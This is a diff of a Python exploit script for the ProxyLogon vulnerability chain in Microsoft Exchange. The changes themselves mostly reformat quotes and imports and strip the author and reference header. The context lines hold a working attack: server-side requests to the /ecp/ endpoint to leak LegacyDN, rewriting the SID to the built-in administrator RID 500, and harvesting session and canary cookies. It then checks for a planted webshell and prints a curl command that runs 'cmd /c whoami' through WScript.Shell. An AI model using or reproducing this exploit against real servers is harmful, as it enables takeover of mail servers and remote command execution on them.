@@ -1,17 +1,11 @@
-# coding: utf-8
-
-"""
-Author: hosch3n
-Reference: https://hosch3n.github.io/2021/08/22/ProxyLogon%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
-"""
-
 import sys
 
 import random
-import re
-import requests
 import string
+import re
 import urllib3
+import requests
+
 
 urllib3.disable_warnings()
 req = requests.session()
@@ -92,7 +86,7 @@ def exploit(target):
             resc = req.post(url=f"{target}/ecp/{getRandom()}", headers=berc_headers, data=autodiscover_data, verify=False)
             if f"DisplayName" in resc.text:
                 print(f"[+] Email: {email}")
-                legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', resc.text)
+                legacydn = re.findall("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)", resc.text)
                 break
             else:
                 print("[-] No LegacyDN")
@@ -116,9 +110,9 @@ def exploit(target):
             print("[-] No SID")
             exit(0)
 
-        sid_rid = sid.rsplit("-", 1)
-        if sid_rid[1] != '500':
-            sid = sid_rid[0] + '-500'
+        sid_rid = sid.rsplit('-', 1)
+        if sid_rid[1] != "500":
+            sid = sid_rid[0] + "-500"
         print(f"[+] Fixed SID: {sid}")
 
         bere_headers = {
@@ -129,8 +123,8 @@ def exploit(target):
         sid_data = f"""<r at="Negotiate" ln=""><s>{sid}</s></r>"""
         rese = req.post(url=f"{target}/ecp/{getRandom()}", headers=bere_headers, data=sid_data, verify=False)
         try:
-            sessid = rese.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]
-            msExchEcpCanary = rese.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
+            sessid = rese.headers["set-cookie"].split("ASP.NET_SessionId=")[1].split(';')[0]
+            msExchEcpCanary = rese.headers["set-cookie"].split("msExchEcpCanary=")[1].split(';')[0]
             print(f"[+] Cookie: ASP.NET_SessionId={sessid}; msExchEcpCanary={msExchEcpCanary}")
         except IndexError:
             print("[-] No SessionId or msExchEcpCanary")
@@ -212,7 +206,7 @@ def exploit(target):
         # webshell_url = f"{target}/owa/auth/{webshell_name}"
         resi = req.get(url=webshell_url, verify=False)
         if "OAB (Default Web Site)" in resi.text:
-            print(f"""[!] Get WebShell: curl -ik {webshell_url} -d 'api=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'""")
+            print(f"""\033[92m[!] Get WebShell: \033[0mcurl -k {webshell_url} -d 'api=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'""")
         else:
             print("[-] No WebShell")
 
@@ -220,10 +214,10 @@ def exploit(target):
         print(f"[ReqError]: {e}\n=>{target}")
         exit(0)
 
-
 def main(argv):
     target = f"https://{argv[1]}"
     exploit(target)
+
 
 if __name__ == "__main__":
     try:
